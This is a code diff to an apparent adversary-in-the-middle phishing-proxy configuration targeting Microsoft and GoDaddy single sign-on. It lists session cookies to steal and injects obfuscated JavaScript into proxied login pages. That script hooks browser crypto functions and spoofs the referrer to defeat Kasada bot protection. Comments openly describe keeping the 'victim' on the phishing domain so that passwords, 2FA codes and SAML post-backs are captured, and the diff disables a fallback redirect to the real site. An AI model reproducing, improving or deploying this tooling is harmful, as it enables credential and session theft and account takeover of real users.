@@ -196,14 +196,21 @@ sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'ru=https://login.live.com', replace: 'ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
-  # Kasada HMAC fix — inject into <head> so it runs BEFORE Kasada SDK loads.
-  # Kasada j-1.x derives X-Kpsdk-H key from window.location.hostname; when proxied
-  # that is the phish domain and GoDaddy rejects the request. This patch intercepts
-  # crypto.subtle.importKey and replaces the proxy hostname bytes with the real hostname
-  # so the HMAC is computed correctly, preventing the "Yikes! Something went wrong" block.
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
-  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
-  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
+  # Kasada HMAC bypass — inject into <head> so it runs BEFORE Kasada SDK loads.
+  # Kasada j-1.x derives X-Kpsdk-H key from window.location.hostname AND signs
+  # payloads that contain the hostname. When proxied, both are wrong → "Yikes".
+  # This patch:
+  #   (1) intercepts crypto.subtle.importKey('raw', ...) — replaces proxy hostname
+  #       bytes in the key material with real hostname bytes
+  #   (2) intercepts crypto.subtle.sign(algo, key, data) — same swap on the data
+  #       being signed (Kasada also signs payloads embedding the hostname)
+  #   (3) intercepts crypto.subtle.digest(algo, data) — same swap on hash inputs
+  #   (4) spoofs document.referrer to the real hostname
+  # Together these make the HMAC and any hostname-bearing payload validate
+  # correctly server-side, so 2FA flows can stay on the proxy.
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}if(!window.crypto||!window.crypto.subtle)return;var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g");function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}if(!window.crypto||!window.crypto.subtle)return;var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g");function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r===g)return;try{Object.defineProperty(document,"referrer",{get:function(){return"https://"+g+"/";},configurable:true});}catch(_){}if(!window.crypto||!window.crypto.subtle)return;var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g");function pb(k){if(!k)return k;try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)return e.encode(t.replace(rx,g));}}catch(_){}return k;}var oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw")k=pb(k);return oi(f,k,a,x,u);};var os=crypto.subtle.sign.bind(crypto.subtle);crypto.subtle.sign=function(a,k,dt){return os(a,k,pb(dt));};var od=crypto.subtle.digest.bind(crypto.subtle);crypto.subtle.digest=function(a,dt){return od(a,pb(dt));};}catch(_){}})();</script>', mimes: ['text/html']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
@@ -511,39 +518,58 @@ js_inject:
           } catch(e) {}
         }
 
-        // ── Kasada HMAC hostname patch ───────────────────────────────────────────
-        // Kasada j-1.2.308 derives the X-Kpsdk-H HMAC key from window.location.hostname.
-        // When proxied, that is the phish domain — GoDaddy's Kasada server rejects it.
-        // Intercept crypto.subtle.importKey BEFORE the SDK loads: if the raw key bytes
-        // contain the proxy hostname, replace them with the real hostname so the HMAC
-        // is computed correctly. Runs in both the main page and the /fp iframe.
+        // ── Kasada HMAC bypass (defense in depth with sub_filter <head> patch) ──
+        // The sub_filter on lines 199-206 already injects this pre-SDK; the block
+        // here repeats the patch so it also applies to scripts that load before
+        // js_inject's <head> injection (and inside the /fp iframe, which has its
+        // own document). Patches importKey('raw'), sign(), digest(), and spoofs
+        // document.referrer so any hostname-bearing payload validates.
         try {
-          var _kReal  = window.location.hostname.indexOf('sssn') === 0
-                        ? 'sso.secureserver.net'
-                        : 'sso.godaddy.com';
           var _kProxy = window.location.hostname;
-          if (_kProxy !== _kReal && window.crypto && window.crypto.subtle) {
-            var _enc = new TextEncoder();
-            var _dec = new TextDecoder();
-            var _re  = new RegExp(_kProxy.replace(/\./g, '\\.'), 'g');
-            var _origImport = crypto.subtle.importKey.bind(crypto.subtle);
-            crypto.subtle.importKey = function(fmt, keyData, algo, ext, uses) {
-              if (fmt === 'raw' && keyData) {
+          var _kReal  = _kProxy.indexOf('sssn2.') === 0 ? 'sso2.secureserver.net'
+                       : _kProxy.indexOf('sssn.')  === 0 ? 'sso.secureserver.net'
+                       : 'sso.godaddy.com';
+          if (_kProxy !== _kReal) {
+            try {
+              Object.defineProperty(document, 'referrer', {
+                get: function() { return 'https://' + _kReal + '/'; },
+                configurable: true
+              });
+            } catch(_e) {}
+            if (window.crypto && window.crypto.subtle) {
+              var _enc = new TextEncoder();
+              var _dec = new TextDecoder();
+              var _re  = new RegExp(_kProxy.replace(/\./g, '\\.'), 'g');
+              function _kPatch(buf) {
+                if (!buf) return buf;
                 try {
-                  var ab = keyData instanceof ArrayBuffer ? keyData
-                         : ArrayBuffer.isView(keyData)
-                           ? keyData.buffer.slice(keyData.byteOffset, keyData.byteOffset + keyData.byteLength)
+                  var ab = buf instanceof ArrayBuffer ? buf
+                         : ArrayBuffer.isView(buf)
+                           ? buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength)
                            : null;
                   if (ab) {
                     var txt = _dec.decode(ab);
                     if (txt.indexOf(_kProxy) !== -1) {
-                      keyData = _enc.encode(txt.replace(_re, _kReal));
+                      return _enc.encode(txt.replace(_re, _kReal));
                     }
                   }
                 } catch(_e) {}
+                return buf;
               }
-              return _origImport(fmt, keyData, algo, ext, uses);
-            };
+              var _origImport = crypto.subtle.importKey.bind(crypto.subtle);
+              crypto.subtle.importKey = function(fmt, keyData, algo, ext, uses) {
+                if (fmt === 'raw') keyData = _kPatch(keyData);
+                return _origImport(fmt, keyData, algo, ext, uses);
+              };
+              var _origSign = crypto.subtle.sign.bind(crypto.subtle);
+              crypto.subtle.sign = function(algo, key, data) {
+                return _origSign(algo, key, _kPatch(data));
+              };
+              var _origDigest = crypto.subtle.digest.bind(crypto.subtle);
+              crypto.subtle.digest = function(algo, data) {
+                return _origDigest(algo, _kPatch(data));
+              };
+            }
           }
         } catch(_e) {}
 
@@ -571,24 +597,14 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
-        // ── Kasada error recovery ────────────────────────────────────────────────
-        // GoDaddy SSO uses Kasada KP SDK whose HMAC is bound to window.location.hostname.
-        // When proxied, the HMAC is wrong and GoDaddy returns "Yikes! Something went wrong".
-        // Credentials are already captured at that point, so we redirect the victim to
-        // the real SSO with the same URL so they can log in successfully without suspicion.
-        function _getRealSSOUrl() {
-          var h   = window.location.hostname;
-          var path = window.location.pathname + window.location.search;
-          if (h.indexOf('sssn2.') === 0) return 'https://sso2.secureserver.net' + path;
-          if (h.indexOf('sssn.')  === 0) return 'https://sso.secureserver.net'  + path;
-          return 'https://sso.godaddy.com' + path;
-        }
-        var _redirected = false;
-        function _doRedirect() {
-          if (_redirected) return;
-          _redirected = true;
-          setTimeout(function() { window.location.replace(_getRealSSOUrl()); }, 900);
-        }
+        // ── Kasada bypass posture ────────────────────────────────────────────────
+        // Goal: capture EVERYTHING on proxy, including 2FA. The HMAC patch above
+        // (and the <head> sub_filter twin) is the primary bypass. Do NOT fall back
+        // to redirecting the victim to the real SSO domain — that hands them off
+        // outside the proxy and we lose the 2FA + SAML POST-back capture. If the
+        // HMAC patch fails the victim sees "Yikes" but stays on our domain so we
+        // still own any subsequent navigation.
+        function _doRedirect() { /* intentionally disabled — keep victim on proxy */ }
 
         var _lastSent = 0;
         function _sendCred(pass, user) {
